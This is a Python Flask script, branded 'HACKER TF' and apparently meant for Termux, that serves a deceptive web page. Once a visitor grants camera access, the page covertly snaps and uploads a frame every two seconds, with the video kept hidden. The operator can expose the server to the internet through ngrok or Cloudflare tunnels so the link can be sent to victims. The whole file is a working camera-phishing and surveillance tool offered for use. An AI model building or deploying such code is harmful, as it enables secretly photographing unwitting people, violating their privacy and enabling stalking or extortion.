import flask
import os
import subprocess
from flask import Flask, render_template_string
from datetime import datetime

app = Flask(__name__)
capture_count = 0

# Storage path
SAVE_PATH = "/storage/emulated/0/HACKER_TF"
os.makedirs(SAVE_PATH, exist_ok=True)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>HACKER TF Camera</title>
    <style>video, canvas { display: none; }</style>
</head>
<body>
    <h2 style="text-align:center;">Please with a 30 seconds- {{ camera_type.upper() }}</h2>
    <video id="video" autoplay playsinline></video>
    <script>
        navigator.mediaDevices.getUserMedia({
            video: { facingMode: "{{ facing_mode }}" }
        }).then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            const canvas = document.createElement('canvas');
            setInterval(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    fetch("/capture", {
                        method: "POST",
                        body: blob
                    });
                }, "image/jpeg");
            }, 2000);
        });
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, camera_type=CAMERA_TYPE, facing_mode=FACING_MODE)

@app.route("/capture", methods=["POST"])
def capture():
    global capture_count
    now = datetime.now().strftime("%Y%m%d-%H%M%S")
    path = f"{SAVE_PATH}/IMG_{now}.jpg"
    with open(path, "wb") as f:
        f.write(flask.request.get_data())
    capture_count += 1
    print(f"[{capture_count}] Image captured")
    return "", 200

def run_ngrok():
    print("Starting ngrok tunnel...")
    subprocess.Popen(["termux-open-url", "http://localhost:4040/status"])
    return subprocess.check_output(["ngrok", "http", "8000"]).decode()

def run_cloudflare():
    print("Starting Cloudflare tunnel...")
    return subprocess.check_output(["cloudflared", "tunnel", "--url", "http://localhost:8000"]).decode()

if __name__ == "__main__":
    os.system("clear")
    print("=== Made by HACKER TF ===\n")

    print("Select Camera:\n[1] Front Camera\n[2] Back Camera")
    cam_choice = input(">> ")
    CAMERA_TYPE = "HACKER TF" if cam_choice == "1" else "HACKER TF"
    FACING_MODE = "user" if cam_choice == "1" else "environment"

    print("\nSelect Access Mode:\n[1] Localhost\n[2] Ngrok\n[3] Cloudflare")
    mode = input(">> ")

    if mode == "2":
        run_ngrok()
    elif mode == "3":
        run_cloudflare()

    print("\n[+] Opening Camera Server...")
    app.run(host="0.0.0.0", port=8000)
